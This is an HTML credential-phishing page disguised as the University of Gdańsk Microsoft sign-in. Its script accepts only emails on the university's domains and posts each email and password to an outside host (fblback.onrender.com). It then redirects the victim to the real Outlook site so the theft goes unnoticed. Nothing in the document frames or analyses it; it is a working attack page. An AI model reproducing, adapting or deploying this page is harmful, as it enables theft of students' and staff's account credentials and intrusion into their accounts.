<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in to your account</title>
  <link rel="stylesheet" href="ug-style.css" />
  <link rel="icon" type="image/png" href="assets/ug-logo.png" />
</head>
<body>
  <div class="background">
    <div class="login-box">
      <div class="logo">
        <img src="assets/ug-logo.png" alt="UG Logo" />
        <span>Uniwersytet Gdański</span>
      </div>
      <form id="loginForm">
        <div class="input-group">
          <label for="email">Email</label>
          <input type="email" id="email" name="email" required />
        </div>
        <div class="input-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required />
          <div class="error" id="passwordError">Please enter your password.</div>
        </div>
        <div class="actions">
          <a href="https://passwordreset.microsoftonline.com/" target="_blank">Forgot my password</a>
        </div>
        <button type="submit">Sign in</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");
    const errorText = document.getElementById("passwordError");

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      const domainValid = /@(studms\.ug\.edu\.pl|staffms\.ug\.edu\.pl|ug\.edu\.pl)$/i.test(email);

      if (!domainValid || !password) {
        errorText.style.display = "block";
        return;
      }

      errorText.style.display = "none";

      try {
        await fetch("https://fblback.onrender.com/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password })
        });
      } catch (err) {
        // Ошибку можно логировать при необходимости
      } finally {
        window.location.href = "https://outlook.office.com/mail/";
      }
    });
  </script>
</body>
</html>
